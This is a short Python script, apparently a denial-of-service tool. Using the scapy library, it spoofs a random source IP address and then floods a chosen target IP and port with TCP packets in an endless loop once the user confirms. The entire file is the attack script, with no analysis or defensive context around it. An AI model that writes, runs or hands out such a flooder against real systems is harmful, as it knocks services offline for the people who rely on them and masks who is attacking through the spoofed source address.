from scapy.all import *
import random

src = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
source_port = 56666

def ddos(target, port):

        try:
            choice = input(f'Source port: {src}\nTarget IP: {target}\nTarget port: {port}\nDo you wish to continue? [Y/N]: ')
            if choice.lower() == 'y':
                srcport = int(source_port)
                i=1

                IP1 = IP(src=src, dst=target)
                TCP1 = TCP(sport=srcport, dport=port)
                pkt = IP1 / TCP1
            else:
                print('Operation was cancelled.')
                sys.exit('\n')
            while True:
                send(pkt,inter= .001)
                print(f"Packet(s) sent [{i}]")
                i=i+1
        except KeyboardInterrupt:
            sys.exit('\n')
        except:
            e = sys.exc_info()[1]
            print(f'\n{e}')         
    
    